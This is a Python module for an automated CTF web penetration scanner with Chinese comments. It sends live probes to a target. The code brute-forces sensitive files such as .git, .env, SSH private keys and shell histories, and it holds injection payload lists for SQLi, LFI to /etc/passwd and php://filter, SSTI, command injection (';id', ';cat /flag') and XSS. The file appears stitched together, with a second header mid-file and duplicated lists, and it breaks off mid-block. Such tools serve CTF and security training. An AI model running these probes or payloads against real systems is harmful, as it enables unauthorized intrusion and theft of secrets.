# -*- coding: utf-8 -*-
"""
Web 渗透扫描（CTF 用）
=====================
给一个 URL，按渗透测试的思路**真的发请求**，自动做这几件事：

  1. 指纹：Server / X-Powered-By / Cookie / 标题 / 是否套了 WAF
  2. 敏感文件：源码泄露（.git/.svn/.DS_Store）、备份包（www.zip）、
     flag 常见位置（flag.php）、phpinfo、.env、后台入口
  3. 参数注入：SQLi / LFI / SSTI / 命令注入 / XSS / PHP 伪协议
  4. 表单：万能密码、常见弱口令、登录框 SQLi
  5. 提取：每个响应里都找 flag（含 base64 套娃）

**只用于你自己有权测试的目标**（比赛题目、自己搭的环境）。
所有请求都限定在你给的那个 host 上，不跟随跨域跳转。
纯标准库，不依赖 requests。
"""
import os
import re
import ssl
import time
import json
import base64
import html
import socket
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from misc import find_flags_in
except Exception:
    from .misc import find_flags_in

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"

# 关掉代理：内网靶场经常被系统代理挡住
for _k in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy", "ALL_PROXY", "all_proxy"):
    os.environ.pop(_k, None)
os.environ["NO_PROXY"] = "*"

_SSL = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode = ssl.CERT_NONE


# ------------------------------------------------------------------ 路径字典
# CTF 里真正高频的东西，不是通用大字典
FILES = [
    "www.zip",
    "wwwroot.zip",
    "web.zip",
    "html.zip",
    "source.zip",
    "src.zip",
    "backup.zip",
    "bak.zip",
    "www.tar.gz",
    "www.tar",
    "web.rar",
    "www.rar",
    "index.php.bak",
    "index.php~",
    "index.php.swp",
    ".index.php.swp",
    "index.php.old",
    "index.php.save",
    "index.bak",
    "index.txt",
    "config.php.bak",
    "config.php~",
    "config.php.swp",
    "db.php.bak",
    ".git/HEAD",
    ".git/config",
    ".git/index",
    ".git/logs/HEAD",
    ".svn/entries",
    ".svn/wc.db",
    ".DS_Store",
    ".hg/hgrc",
    "robots.txt",
    "sitemap.xml",
    "crossdomain.xml",
    "web.config",
    ".htaccess",
    "phpinfo.php",
    "info.php",
    "php_info.php",
    "test.php",
    "1.php",
    "shell.php",
    ".env",
    "config.php",
    "composer.json",
    "package.json",
    "Dockerfile",
    "docker-compose.yml",
    "README.md",
    "flag.php",
    "flag.txt",
    "flag",
    "f1ag.php",
    "F1ag.php",
    "FLAG.php",
    "flag.html",
    "flags.php",
    "flag.php.bak",
    "flag.txt.bak",
    "getflag.php",
    "admin.php",
    "login.php",
    "upload.php",
    "admin/",
    "login/",
    "upload/",
    "manage/",
    "manager/",
    "backup/",
    "bak/",
    "src/",
    "source/",
    "test/",
    "tmp/",
    "temp/",
    "api/",
    "static/",
    "assets/",
    "console/",
    "debug/",
    "private/",
    "files/",
    "data/",
    "includes/",
    "inc/",
    ".env.bak",
    ".env.local",
    ".env.prod",
    ".env.example",
    "env",
    "env.js",
    "config.js",
    "config.json",
    "config.yml",
    "config.yaml",
    "appsettings.json",
    "appsettings.Development.json",
    "wp-config.php",
    "wp-config.php.bak",
    "wp-config.php.swp",
    "configuration.php",
    "settings.py",
    "settings.php",
    "database.yml",
    "secrets.yml",
    "secrets.json",
    "id_rsa",
    "id_rsa.pub",
    ".ssh/id_rsa",
    "authorized_keys",
    ".bash_history",
    ".mysql_history",
    ".rediscli_history",
    "db.sql",
    "data.sql",
    "dump.sql",
    "database.sql",
    "backup.sql",
    "test.sql",
    "install.sql",
    "schema.sql",
    "mysql.sql",
    "users.sql",
    "db.bak",
    "data.bak",
    "backup.tar.gz",
    "backup.tar",
    "site.tar.gz",
    "release.tar.gz",
    "deploy.tar.gz",
    "app.zip",
    "code.zip",
    "source.tar.gz",
    "1.zip",
    "2.zip",
    "test.zip",
    "bak.tar.gz",
    "新建文本文档.zip",
    ".hg/store/00manifest.i",
    ".bzr/README",
    ".idea/workspace.xml",
    ".vscode/settings.json",
    "nbproject/project.properties",
    ".settings/org.eclipse.core.resources.prefs",
    "node_modules/.package-lock.json",
    ".eslintrc.js",
    ".npmrc",
    "WEB-INF/web.xml",
    "WEB-INF/classes/application.properties",
    "WEB-INF/lib/",
    "META-INF/context.xml",
    "manager/html",
    "status",
    "jmx-console/",
    "invoker/JMXInvokerServlet",
    "actuator",
    "actuator/env",
    "actuator/health",
    "actuator/heapdump",
    "actuator/mappings",
    "actuator/beans",
    "v2/api-docs",
    "v3/api-docs",
    "openapi.json",
    "api.html",
    "doc.html",
    "phpmyadmin/",
    "pma/",
    "adminer.php",
    "myadmin/",
    "vendor/composer/installed.json",
    "composer.lock",
    "yarn.lock",
    "package-lock.json",
    "sitemap.txt",
    "clientaccesspolicy.xml",
    "humans.txt",
    "ads.txt",
    "security.txt",
    "readme.html",
    "CHANGELOG",
    "LICENSE",
    "install.php",
    "admin/login.php",
    "administrator/",
    "backend/",
    "wp-admin/",
    "wp-login.php",
    "user/",
    "login.html",
    "register",
    "getflag",
    "getkey.php",
    "key.php",
    "hint.php",
    "hint.txt",
    "tips",
    "robots",
    "index.php.swp~",
    ".flag",
    "flag.zip",
    "flag.rar",
]


# 参数注入的探测载荷
SQLI_ERROR = [
    ("1'", "单引号"),
    ('1"', "双引号"),
    ("1' or '1'='1", "or 恒真"),
    ("1'-- -", "注释截断"),
    ("1') or ('1'='1", "括号闭合"),
]
SQLI_BOOL = [("1 and 1=1", "1 and 1=2"), ("1' and '1'='1", "1' and '1'='2")]
SQL_ERRORS = [
    "SQL syntax", "mysql_fetch", "mysql_num_rows", "You have an error in your SQL",
    "Warning: mysqli", "Warning: mysql", "Unclosed quotation mark",
    "ORA-01756", "ORA-00933", "PostgreSQL", "SQLite3::", "syntax error at or near",
    "Microsoft OLE DB Provider for ODBC Drivers",
]
LFI_PAYLOADS = [
    ("../../../../etc/passwd", "linux"),
    ("....//....//....//....//etc/passwd", "linux 绕过滤"),
    ("/etc/passwd", "绝对路径"),
    ("..\\..\\..\\..\\windows\\win.ini", "windows"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP 伪协议"),
    ("php://filter/convert.base64-encode/resource=flag.php", "PHP 伪协议读 flag"),
    ("../../../../flag", "直接读 flag"),
    ("../../../../flag.txt", "直接读 flag.txt"),
]
SSTI_PAYLOADS = [
    ("{{7*7}}", "{{7*8}}", "Jinja2/Twig"),
    ("${7*7}", "${7*8}", "Freemarker/JSP EL"),
    ("<%= 7*7 %>", "<%= 7*8 %>", "ERB/JSP"),
    ("{7*7}", "{7*8}", "Smarty"),
    ("#{7*7}", "#{7*8}", "Ruby"),
    ("@(7*7)", "@(7*8)", "Velocity"),
]
CMD_PAYLOADS = [
    (";id", ";id"),
    ("|id", "|id"),
    ("||id", "||id"),
    ("&id", "&id"),
    ("$(id)", "$(id)"),
    ("`id`", "`id`"),
    (";cat /flag", ";cat /flag"),
    ("|cat flag.php", "|cat flag.php"),
]
XSS_PAYLOAD = '<script>alert("xss")</script>'


# ------------------------------------------------------------------ HTTP 基础
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """不让 urllib 自动跟跳转 —— 302 本身就是情报（比如跳去后台）"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_OPENER = urllib.request.build_opener(
    _NoRedirect,
    urllib.request.HTTPSHandler(context=_SSL),
)
# 不走代理的 opener：访问本地/内网时用
# （很多人开着 Clash/V2Ray，系统代理会把 127.0.0.1 的请求也转走，
#   结果要么慢好几秒，要么直接被代理返回 502）
_OPENER_DIRECT = urllib.request.build_opener(
    _NoRedirect,
    urllib.request.ProxyHandler({}),
    urllib.request.HTTPSHandler(context=_SSL),
)


def is_local_host(host):
    """判断是不是本地/内网地址（这些不走代理）"""
    h = (host or "").strip().lower()
    if not h:
        return False
    if h.startswith("[") and "]" in h:
        h = h[1:h.index("]")]
    if h in ("localhost", "127.0.0.1", "::1", "0.0.0.0"):
        return True
    if h.endswith(".local") or h.endswith(".internal") or h.endswith(".lan"):
        return True
    try:
        import ipaddress
        ip = ipaddress.ip_address(h)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except Exception:
        pass
    # 主机名里带 localhost 的也算
    return "localhost" in h


def _pick_opener(url):
    try:
        host = urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        host = ""
    return _OPENER_DIRECT if is_local_host(host) else _OPENER


# -*- coding: utf-8 -*-
"""web 一把梭的深度扩充：更多路径 + 备份后缀 + 方法探测 + 安全头/CORS + CMS 指纹"""

# ------------------------------------------------------------ 额外的敏感路径
FILES_EXTRA = [
    # 环境配置 / 密钥
    ".env", ".env.bak", ".env.local", ".env.prod", ".env.example",
    "env", "env.js", "config.js", "config.json", "config.yml", "config.yaml",
    "appsettings.json", "appsettings.Development.json", "web.config",
    "wp-config.php", "wp-config.php.bak", "wp-config.php.swp",
    "configuration.php", "settings.py", "settings.php", "database.yml",
    "secrets.yml", "secrets.json", "id_rsa", "id_rsa.pub", ".ssh/id_rsa",
    "authorized_keys", ".bash_history", ".mysql_history", ".rediscli_history",
    # 数据库 / 备份
    "db.sql", "data.sql", "dump.sql", "database.sql", "backup.sql",
    "test.sql", "install.sql", "schema.sql", "mysql.sql", "users.sql",
    "db.bak", "data.bak", "backup.tar.gz", "backup.tar", "site.tar.gz",
    "release.tar.gz", "deploy.tar.gz", "app.zip", "code.zip", "source.tar.gz",
    "1.zip", "2.zip", "test.zip", "bak.tar.gz", "新建文本文档.zip",
    # 版本库 / 编辑器残留
    ".svn/entries", ".svn/wc.db", ".hg/store/00manifest.i",
    ".bzr/README", ".DS_Store", ".idea/workspace.xml", ".vscode/settings.json",
    "nbproject/project.properties", ".settings/org.eclipse.core.resources.prefs",
    "node_modules/.package-lock.json", ".eslintrc.js", ".npmrc", ".htaccess",
    # 框架 / 中间件
    "WEB-INF/web.xml", "WEB-INF/classes/application.properties",
    "WEB-INF/lib/", "META-INF/context.xml", "manager/html", "status",
    "jmx-console/", "invoker/JMXInvokerServlet", "actuator", "actuator/env",
    "actuator/health", "actuator/heapdump", "actuator/mappings", "actuator/beans",
    "env/{SUFFIX}", "swagger-ui.html", "swagger-ui/index.html", "api/swagger-ui.html",
    "v2/api-docs", "v3/api-docs", "openapi.json", "api.html", "doc.html",
    "phpmyadmin/", "pma/", "adminer.php", "myadmin/",
    "vendor/composer/installed.json", "composer.lock", "composer.json",
    "yarn.lock", "package-lock.json", "package.json",
    # CMS / 管理后台
    "robots.txt", "sitemap.xml", "sitemap.txt", "crossdomain.xml",
    "clientaccesspolicy.xml", "humans.txt", "ads.txt", "security.txt",
    "readme.html", "CHANGELOG", "README.md", "LICENSE", "install.php",
    "admin/", "admin/login.php", "administrator/", "manage/", "backend/",
    "wp-admin/", "wp-login.php", "user/", "login.php", "login.html", "register",
    # flag 直给
    "flag", "flag.php", "flag.txt", "flag.html", "getflag", "getflag.php",
    "getkey.php", "key.php", "hint.php", "hint.txt", "tips", "robots",
    "index.php.swp~", ".flag", "flag.zip", "flag.rar",
]

# 备份后缀：对每个「已发现的活路径」再试一遍
BAK_SUFFIXES = [".bak", ".swp", ".swo", ".old", ".save", ".orig", ".~",
                "~", ".zip", ".rar", ".7z", ".tar.gz", ".sql", ".gz", ".tmp",
                ".copy", ".1", ".bak~", "_bak", "_backup"]


def probe_backup_suffixes(base_url, discovered, say, take, add_flag,
                          timeout, limit=30):
    """
    对已发现的「活路径」试备份后缀：index.php → index.php.bak / .swp / .zip…
    这是拿源码最快的一招，命中率很高。
    """
    if not discovered:
        return 0
    tried = 0
    found = 0
    for rel in list(discovered):
        if not take() or tried > limit:
            break
        if "/" not in rel:            # 只看带目录的，比如 /admin/index.php
            continue
        stem = rel.rsplit("/", 1)
        leaf, parent = stem[1], stem[0] + "/"
        if not leaf or leaf.startswith("."):
            continue
        for suf in BAK_SUFFIXES:
            if not take() or tried > limit:
                break
            cand = parent + leaf + suf
            if cand in discovered:
                continue
            tried += 1
            r = _http(base_url + cand, timeout=timeout)
            if r["status"] in (200, 206) and r["len"] > 20:
                found += 1
                add_flag_from(r, "备份文件 " + cand, add_flag)
                h, _c = harvest(_text(r), cand)
                for f in h:
                    add_flag(f, "备份文件 " + cand)
                say(f"  命中备份文件：{cand}（{human(r['len'])}）", "ok")
                discovered.add(cand)
    if tried:
        say(f"  备份后缀探测：试了 {tried} 个，命中 {found} 个", "dim")
    return found


def probe_http_methods(url, say, take, timeout):
    """
    HTTP 方法探测（只做只读探测，不真的 PUT/DELETE，避免破坏目标）：
      OPTIONS 看 Allow 头；TRACE 看是否回显；Host/X-Forwarded-Host 探测。
    """
    if not take():
        return
    findings = []
    r = _http(url, method="OPTIONS", timeout=timeout)
    allow = ""
    for k, v in (r.get("headers") or {}).items():
        if k.lower() == "allow":
            allow = v
    if allow:
        bad = [m for m in ("PUT", "DELETE", "TRACE", "PATCH", "CONNECT")
               if m in allow.upper()]
        findings.append(f"允许的方法：{allow}")
        if bad:
            findings.append("★ 打开了危险方法：%s（PUT 可写文件 / TRACE 可 XST）"
                            % ", ".join(bad))
    else:
        findings.append("OPTIONS 无响应或没返回 Allow 头")

    r2 = _http(url, method="TRACE", timeout=timeout)
    if r2["status"] == 200 and "Trace" in (_text(r2)[:300]):
        findings.append("★ TRACE 可用，可能存在跨站追踪（XST）")

    for line in findings:
        say("  " + line, "warn" if line.startswith("★") else "dim")


def probe_security_headers(url, say, take, timeout):
    """安全响应头 + CORS 配置检查（一把梭的 Web 报告用）"""
    if not take():
        return
    r = _http(url, timeout=timeout)
    hs = {}
    for k, v in (r.get("headers") or {}).items():
        hs[k.lower()] = v

    missing = [h for h in ("x-frame-options", "content-security-policy",
                           "x-content-type-options", "strict-transport-security")
               if h not in hs]
    if missing:
        say("  没配的安全响应头：" + ", ".join(missing), "dim")
    if hs.get("server") or hs.get("x-powered-by"):
        say(f"  服务端软件：{hs.get('server', '')} / "
            f"{hs.get('x-powered-by', '')}（建议关掉版本信息）", "dim")

    # CORS：看会不会原样回显任意 Origin
    import urllib.parse as _up
    evil = "https://evil-ctf-test.example"
    r2 = _http(url + "?cb=" + str(int(__import__("time").time())),
               headers={"Origin": evil}, timeout=timeout)
    for k, v in (r2.get("headers") or {}).items():
        if k.lower() == "access-control-allow-origin":
            if v.strip() == evil or v.strip() == "*":
                say(f"★ CORS 回显了任意 Origin（{v}）——可被跨域读数据", "warn")
            break
    if r2["status"] == 500 and "Origin" in _text(r2)[:2000]:
        say("  （带 Origin 时返回 500，可能是 Origin 白名单校验）", "dim")


CMS_RULES = [
    ("WordPress", ["/wp-content/", "/wp-includes/", "wp-json"]),
    ("Drupal", ["drupal", "/sites/default/", "Drupal.settings"]),
    ("Joomla", ["/administrator/", "joomla", "/templates/"]),
    ("ThinkPHP", ["thinkphp", "ThinkPHP", "/index.php?s="]),
    ("Laravel", ["laravel_session", "XSRF-TOKEN"]),
    ("Spring Boot", ["Whitelabel Error Page", "actuator", "ServletException"]),
    ("Apache Tomcat", ["Apache Tomcat", "/manager/html", "Tomcat"]),
    ("Nginx", ["nginx"]),
    ("phpMyAdmin", ["phpMyAdmin", "pma_password"]),
    ("Shiro", ["rememberMe=deleteMe", "shiro"]),
    ("Flask/Werkzeug", ["Werkzeug", "flask"]),
    ("ASP.NET", ["__VIEWSTATE", "asp.net", "X-AspNet"]),
    ("WeLogic", ["WebLogic", "weblogic"]),
    ("Grafana", ["grafana", "Grafana"]),
    ("GitLab", ["gitlab", "GitLab"]),
]


def fingerprint_cms(url, say, take, timeout):
    """CMS / 框架指纹：认出常用 CMS 并提示对应的经典路径"""
    if not take():
        return
    r = _http(url, timeout=timeout)
    if r["status"] != 200:
        return
    txt = _text(r)[:200000]
    hdr = " ".join("%s:%s" % (k, v) for k, v in (r.get("headers") or {}).items())
    hits = []
    for name, keys in CMS_RULES:
        if any(k in txt or k in hdr for k in keys):
            hits.append(name)
    if hits:
        say("  识别到 CMS/框架：" + ", ".join(hits[:5]), "ok")
    else:
        say("  没认出常见 CMS（静态页或自研）", "dim")


def extract_paths_from(text):
    """从 robots.txt / sitemap.xml 里抽路径（题目常把入口藏在这两个文件里）"""
    import urllib.parse
    out = set()
    if not text:
        return out

    def keep(p):
        p = (p or "").strip().strip('"').strip("'").strip()
        if not p:
            return
        if p.lower().startswith(("http://", "https://")):
            p = urllib.parse.urlsplit(p).path
        p = p.split("?")[0].split("#")[0].strip()
        if not p or p in ("/", "*"):
            return
        if p.startswith("/") and not p.startswith("//"):
            out.add(p)

    # robots.txt：Disallow: /xxx / Allow: /xxx
    for m in re.finditer(r"(?im)^\s*(?:disallow|allow|sitemap)\s*:\s*(\S+)", text):
        keep(m.group(1))
    # sitemap.xml：<loc>http://host/xxx</loc>
    for m in re.finditer(r"(?is)<loc>\s*([^<>\s]+)\s*</loc>", text):
        keep(m.group(1))
    # 纯文本里一行一个的路径
    for line in text.splitlines():
        t = line.strip().strip('"').strip("'").strip()
        if t.startswith("/") and " " not in t and not t.startswith("//"):
            keep(t)
    return {x for x in out if len(x) < 200}

def _http(url, method="GET", data=None, timeout=6, headers=None):
    """发一个请求，返回 dict。不抛异常，错误放在 error 里。"""
    h = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        else:
            body = data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    out = {"url": url, "status": 0, "headers": {}, "body": b"",
           "len": 0, "elapsed": 0, "error": ""}
    try:
        r = _pick_opener(url).open(req, timeout=timeout)
        out["status"] = r.status
        out["headers"] = {k.lower(): v for k, v in r.headers.items()}
        out["body"] = r.read(2 * 1024 * 1024)
    except urllib.error.HTTPError as e:
        out["status"] = e.code
        try:
            out["headers"] = {k.lower(): v for k, v in e.headers.items()}
            out["body"] = e.read(2 * 1024 * 1024)
        except Exception:
            pass
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
    out["len"] = len(out["body"])
    out["elapsed"] = time.time() - t0
    return out


def _text(resp):
    b = resp.get("body") or b""
    for enc in ("utf-8", "gbk", "latin-1"):
        try:
            return b.decode(enc)
        except Exception:
            continue
    return b.decode("utf-8", "ignore")


def _join(base, path):
    if not base.endswith("/"):
        base += "/"
    return urllib.parse.urljoin(base, path.lstrip("/"))


def _set_query(url, param, value):
    p = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    found = False
    nq = []
    for k, v in q:
        if k == param:
            nq.append((k, value))
            found = True
        else:
            nq.append((k, v))
    if not found:
        nq.append((param, value))
    return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path,
                                    urllib.parse.urlencode(nq), p.fragment))


# ------------------------------------------------------------------ flag 提取
def harvest(body, extra=""):
    """从响应里找 flag：明文 + base64 + 常见编码套娃"""
    if not body:
        return []
    hits = []
    h, _ = find_flags_in(body if isinstance(body, bytes) else body.encode("utf-8", "ignore"))
    hits += [x.decode("utf-8", "ignore") for x in h]
    # base64 里套 flag
    txt = body.decode("latin-1", "ignore") if isinstance(body, bytes) else body
    for m in re.finditer(r"[A-Za-z0-9+/]{16,}={0,2}", txt):
        blob = m.group()
        try:
            dec = base64.b64decode(blob + "=" * ((-len(blob)) % 4))
        except Exception:
            continue
        if b"flag" not in dec.lower():
            continue
        h2, _ = find_flags_in(dec)
        hits += [x.decode("utf-8", "ignore") for x in h2]
    # 去重
    seen, out = set(), []
    for x in hits:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out

# ------------------------------------------------------------ 解码变体
def decode_variants(s):
    """
    给一段可疑文本，返回所有「可能是它的明文」的候选 [(方法, 文本)]。
    覆盖 CTF 里最常见的藏法：HTML 实体 / Unicode 转义 / JS 十六进制 /
    JS 八进制 / URL / Base64 / Hex / 二进制 / ROT13 / Atbash / 反转。
    """
    out = []
    t = (s or "").strip()
    if not t or len(t) > 200000:
        return out

    def add(name, v):
        if v and v != t and v not in [x[1] for x in out]:
            out.append((name, v))

    # HTML 实体
    if "&#" in t or "&lt;" in t or "&gt;" in t or "&amp;" in t:
        try:
            add("HTML 实体", html.unescape(t))
        except Exception:
            pass
    # Unicode 转义 \uXXXX
    if "\\u" in t:
        try:
            add("Unicode 转义",
                re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), t))
        except Exception:
            pass
    # JS 十六进制 \xNN
    if "\\x" in t:
        try:
            add("JS 十六进制",
                re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), t))
        except Exception:
            pass
    # JS 八进制 \NNN
    if re.search(r"\\[0-7]{2,3}", t):
        try:
            add("JS 八进制",
                re.sub(r"\\([0-7]{2,3})", lambda m: chr(int(m.group(1), 8)), t))
        except Exception:
            pass
    # URL
    if "%" in t:
        add("URL 编码", urllib.parse.unquote(t))
    # Base64（至少 12 位，解出来要能当文本）
    for m in re.finditer(r"[A-Za-z0-9+/_\-]{12,}={0,2}", t):
        blob = m.group()
        try:
            dec = base64.b64decode(blob + "=" * ((-len(blob)) % 4))
            txt = dec.decode("utf-8")
        except Exception:
            continue
        if txt and sum(1 for c in txt if c.isprintable() or c in "\r\n\t") / len(txt) > 0.9:
            add("Base64", txt)
    # Hex
    for m in re.finditer(r"(?:[0-9a-fA-F]{2}){8,}", t):
        try:
            txt = bytes.fromhex(m.group()).decode("utf-8")
        except Exception:
            continue
        if txt and sum(1 for c in txt if c.isprintable() or c in "\r\n\t") / len(txt) > 0.9:
            add("Hex", txt)
    # 二进制
    bits = re.sub(r"[^01]", "", t)
    if len(bits) >= 16 and len(bits) % 8 == 0 and len(bits) >= len(t) * 0.8:
        try:
            add("二进制", bytes(int(bits[i:i + 8], 2)
                             for i in range(0, len(bits), 8)).decode("utf-8"))
        except Exception:
            pass
    # 凯撒 / Atbash / 反转（只在字母占比高时才试）
    letters = sum(1 for c in t if c.isalpha())
    if letters and letters / len(t) > 0.7 and len(t) <= 400:
        add("反转", t[::-1])
        add("Atbash", "".join(chr(219 - ord(c)) if "a" <= c <= "z"
                            else (chr(155 - ord(c)) if "A" <= c <= "Z" else c) for c in t))
        low = t.lower()
        if "flag" not in low and "ctf" not in low:
            for k in (13, 5, -5, 3, -3, 8, -8):
                add(f"凯撒{k:+d}", "".join(
                    chr((ord(c) - 97 + k) % 26 + 97) if "a" <= c <= "z"
                    else (chr((ord(c) - 65 + k) % 26 + 65) if "A" <= c <= "Z" else c)
                    for c in t))
    return out


def scan_value(where, s, add_flag, max_len=100000):
    """
    扫一处可疑文本：先直接找 flag，找不到就把所有解码变体都试一遍。
    返回找到的个数。
    """
    if not s or len(s) > max_len:
        return 0
    n = 0
    try:
        h, _ = find_flags_in(s.encode("utf-8", "ignore"))
    except Exception:
        h = set()
    for x in h:
        add_flag(x.decode("utf-8", "ignore"), where)
        n += 1
    if n:
        return n
    for method, txt in decode_variants(s):
        try:
            h2, _ = find_flags_in(txt.encode("utf-8", "ignore"))
        except Exception:
            continue
        for x in h2:
            add_flag(x.decode("utf-8", "ignore"), "%s → %s" % (where, method))
            n += 1
    return n


def deep_source(base_url, resp, say, add_flag, take, timeout,
                max_js=6, max_links=6):
    """
    源码深度分析：简单的 Web 题 90% 的 flag 就藏在这几处。
      响应头 / HTML 注释 / meta / 隐藏字段 / 内联 JS / 外链 JS / Cookie / 页面链接
    每一处都会尝试解码（Base64 / Hex / HTML 实体 / JS 转义 / URL / 凯撒…）。
    """
    say("== 源码深度分析 ==", "h")
    text = _text(resp)
    total = 0

    def bump(k):
        nonlocal total
        total += k

    # 1) 响应头（X-Flag 这种自定义头很常见）
    for k, v in (resp.get("headers") or {}).items():
        bump(scan_value("响应头 " + k, v, add_flag))

    # 2) HTML 注释
    for m in re.finditer(r"<!--(.*?)-->", text, re.S):
        bump(scan_value("HTML 注释", m.group(1), add_flag))

    # 3) meta / 隐藏字段 / data-*
    for m in re.finditer(r"""<meta[^>]*content\s*=\s*["']([^"']+)["']""", text, re.I):
        bump(scan_value("meta", m.group(1), add_flag))
    for m in re.finditer(
            r"""<input[^>]*type\s*=\s*["']hidden["'][^>]*value\s*=\s*["']([^"']+)["']""",
            text, re.I):
        bump(scan_value("隐藏字段", m.group(1), add_flag))
    for m in re.finditer(r"""data-[\w-]+\s*=\s*["']([^"']{6,})["']""", text, re.I):
        bump(scan_value("data 属性", m.group(1), add_flag))

    # 4) 内联 script
    for m in re.finditer(r"<script[^>]*>(.*?)</script>", text, re.S | re.I):
        bump(scan_value("内联 JS", m.group(1), add_flag))

    # 5) 外链 JS（同源）
    host = urllib.parse.urlsplit(base_url).netloc
    srcs = re.findall(r"""<script[^>]+src\s*=\s*["']([^"']+)["']""", text, re.I)
    srcs = [urllib.parse.urljoin(base_url, x) for x in srcs]
    srcs = [x for x in srcs if urllib.parse.urlsplit(x).netloc == host][:max_js]
    for u in srcs:
        if not take():
            break
        r = _http(u, timeout=timeout)
        if r["status"] == 200 and r["len"]:
            bump(scan_value("JS " + u.rsplit("/", 1)[-1][:24], _text(r), add_flag))

    # 6) Cookie
    ck = resp.get("headers", {}).get("set-cookie", "")
    for c in re.findall(r"([^=;,\s]+)=([^;,\s]+)", ck):
        bump(scan_value("Cookie " + c[0], c[1], add_flag))

    # 7) 页面里的同源链接
    links = re.findall(r"""href\s*=\s*["']([^"'#?]+)""", text, re.I)
    links = [urllib.parse.urljoin(base_url, x) for x in links]
    seen, picked = set(), []
    for x in links:
        if urllib.parse.urlsplit(x).netloc != host:
            continue
        if x in seen or x.rstrip("/") == base_url.rstrip("/"):
            continue
        seen.add(x)
        picked.append(x)
    for u in picked[:max_links]:
        if not take():
            break
        r = _http(u, timeout=timeout)
        if r["status"] == 200 and r["len"]:
            bump(scan_value("页面 " + urllib.parse.urlsplit(u).path[:28], _text(r), add_flag))

    # 8) 全页超长可疑串（源码里直接甩一坨 base64/hex）
    for m in re.finditer(r"[A-Za-z0-9+/_\-]{40,}", text):
        bump(scan_value("源码长串", m.group(), add_flag))

    if total:
        say("  源码里找到 %d 个 flag" % total, "ok")
    else:
        say("  响应头 / 注释 / JS / Cookie / 链接里都没找到 flag", "dim")
    say("  （看了 %d 个 JS、%d 个链接）" % (len(srcs), min(len(picked), max_links)), "dim")
    say("")
    return total


# ------------------------------------------------------------------ 扫描主体
def scan(url, threads=8, timeout=6, max_req=700, time_limit=180,
         progress=None, deep=True):
    """
    对一个 URL 做渗透式扫描。
    返回 {"lines": [(文本, 标签)], "flags": [...], "findings": [...], "stats": {...}}
    """
    rep = {"lines": [], "flags": [], "findings": [], "stats": {}}
    L = rep["lines"]
    t0 = time.time()
    budget = {"n": 0}

    def say(s, tag=""):
        L.append((s, tag))

    def take():
        """请求预算 + 时间预算"""
        budget["n"] += 1
        if budget["n"] > max_req:
            return False
        if time.time() - t0 > time_limit:
            return False
        return True

    # XXE / 上传绕过这类步骤虽然请求不多，但经常被前面的路径探测把预算吃光，
    # 所以给它们一份独立的额度（不和主预算抢）
    extra_budget = {"n": 0}

    def take_extra(limit=60):
        extra_budget["n"] += 1
        return extra_budget["n"] <= limit and (time.time() - t0 < time_limit)

    def add_flag(f, where):
        if f not in rep["flags"]:
            rep["flags"].append(f)
            rep["findings"].append({"type": "flag", "where": where, "flag": f})
            say(f"    ★ {f}    ← {where}", "ok")

    # ---------- 规范化 URL
    u = url.strip()
    if not u:
        say("请输入目标 URL，例如 http://1.2.3.4:8080/", "warn")
        return rep
    if not re.match(r"^https?://", u, re.I):
        u = "http://" + u
    p = urllib.parse.urlsplit(u)
    host = p.netloc
    root = f"{p.scheme}://{host}"
    base_dir = root + (p.path if p.path.endswith("/") else
                       (p.path.rsplit("/", 1)[0] + "/" if "/" in p.path else "/"))

    say("=" * 62, "dim")
    say("  Web 渗透扫描（只对你有权测试的目标使用）", "h")
    say("=" * 62, "dim")
    say(f"目标：{root}    并发 {threads}    请求上限 {max_req}    时限 {time_limit}s")
    say("")

    # ---------- 1. 指纹
    say("== 1. 指纹 / 基础信息 ==", "h")
    base = _http(u, timeout=timeout)
    budget["n"] += 1
    if base["error"]:
        say(f"  连不上：{base['error']}", "err")
        say("  检查：地址端口对不对？靶场起了没？需不需要挂 Host 头？", "warn")
        return rep
    # 首页 302 跳转很常见（/ → /login），跟一层，否则后面的路径全探错地方
    if base["status"] in (301, 302, 303, 307, 308):
        loc = base["headers"].get("location", "")
        if loc:
            nu = urllib.parse.urljoin(u, loc)
            if urllib.parse.urlsplit(nu).netloc == host:
                say(f"  首页跳转到 {nu}（跟过去继续扫）")
                u = nu
                base = _http(u, timeout=timeout)
                budget["n"] += 1
                base_dir = root + (urllib.parse.urlsplit(u).path.rsplit("/", 1)[0] + "/"
                                   if "/" in urllib.parse.urlsplit(u).path else "/")
    say(f"  HTTP {base['status']}    {base['len']} 字节    {base['elapsed'] * 1000:.0f} ms")
    for k in ("server", "x-powered-by", "set-cookie", "content-type",
              "x-frame-options", "content-security-policy", "location"):
        if k in base["headers"]:
            v = base["headers"][k]
            say(f"  {k}: {v[:160]}")
    title = re.search(r"<title[^>]*>(.*?)</title>", _text(base), re.I | re.S)
    if title:
        say(f"  标题：{title.group(1).strip()[:100]}")
    ck = base["headers"].get("set-cookie", "")
    if ck:
        # cookie 里塞 JWT 的题很多
        m = re.search(r"([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]{10,})", ck)
        if m:
            tok = m.group(1)
            say("  ★ Cookie 里是 JWT，自动试弱密钥…", "ok")
            rep["findings"].append({"type": "jwt", "where": "cookie", "value": tok})
            try:
                import web as _web
